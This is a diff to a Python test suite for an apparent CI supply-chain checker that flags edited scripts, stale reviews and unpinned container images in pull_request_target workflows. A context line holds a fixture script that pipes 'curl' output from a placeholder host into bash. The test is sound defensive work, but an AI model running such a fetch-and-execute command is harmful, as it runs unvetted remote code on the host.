@@ -1763,6 +1763,10 @@ for label, tree in {
     "editing a script": {**FULL_TREE, "scripts/tool.sh": "curl -fsSL https://x.test/i.sh | bash\n"},
     "adding a file": {**FULL_TREE, "scripts/other.sh": "echo new\n"},
     "deleting a file": {name: body for name, body in FULL_TREE.items() if name != "docs/notes.md"},
+    "renaming a file without changing its bytes": {
+        **{name: body for name, body in FULL_TREE.items() if name != "docs/notes.md"},
+        "docs/moved.md": FULL_TREE["docs/notes.md"],
+    },
 }.items():
     expect(
         with_review(tree, FULL_TREE_ROW),
@@ -1843,6 +1847,12 @@ for label, mutate, code, fragment in (
         "STALE REVIEWED",
     ),
     (
+        "a tracked file deleted from disk but still in the index",
+        lambda root: os.remove(os.path.join(root, "docs", "notes.md")),
+        1,
+        "STALE REVIEWED",
+    ),
+    (
         "a removed tracked file",
         lambda root: subprocess.run(["git", "-C", root, "rm", "-q", "-f", "docs/notes.md"], check=True),
         1,
@@ -1883,6 +1893,8 @@ for label, job_yaml in {
     "a job container mapping image tag": "container:\n  image: ghcr.io/x/evil:latest\n",
     "a job container with no image": "container:\n  options: --cpus 1\n",
     "a job container chosen by an expression": "container: ${{ vars.IMAGE }}\n",
+    "an expression in front of a digest": "container: ${{ vars.REGISTRY }}/tool@sha256:" + "a" * 64 + "\n",
+    "an unspaced expression in front of a digest": "container: ${{vars.REGISTRY}}/tool@sha256:" + "a" * 64 + "\n",
     "a service image tag": "services:\n  db:\n    image: postgres:16\n",
     "a service string image": "services:\n  db: postgres:16\n",
     "a tag beside a digest-pinned service": f"services:\n  db:\n    image: {PINNED_IMAGE}\n  cache:\n    image: redis:7\n",
@@ -1903,7 +1915,11 @@ for label, job_yaml in {
     "a digest-pinned service": f"services:\n  db:\n    image: {PINNED_IMAGE}\n",
 }.items():
     job = shaped_job("- run: echo hi", None, job_yaml)
-    row = review_row(job, "target.yml [pull_request_target]", "review")
+    try:
+        row = review_row(job, "target.yml [pull_request_target]", "review")
+    except AssertionError as error:
+        fail(f"{label}: a digest-pinned image must be reviewable ({error})")
+        continue
     code, output = run_checker(with_review(job, row), *REVIEWED_ARGS)
     computed = named_reasons(output)
     if code == 1 and computed == {"fetch"} and "image ghcr.io/x/tool@sha256:" in output:
